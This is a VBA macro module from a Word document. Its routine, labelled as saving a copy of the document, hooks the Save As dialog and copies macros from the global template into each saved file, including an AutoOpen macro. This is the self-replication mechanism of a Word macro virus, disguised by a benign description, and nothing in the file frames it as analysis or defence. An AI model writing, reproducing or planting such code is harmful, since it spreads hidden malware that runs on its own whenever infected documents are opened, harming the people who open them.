   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Payload"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Payload.MAIN"
   Dim Me_$
   Dim Macro$
   On Error GoTo -1: On Error GoTo Abort

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1

   Me_$ = WordBasic.[FileName$]()
   Macro$ = Me_$ + ":Payload"
   WordBasic.MacroCopy "Global:FileSaveAs", Macro$
   Macro$ = Me_$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Payload", Macro$

   Abort:
   If Err.Number <> 102 Then WordBasic.FileSaveAs dlg
   End Sub
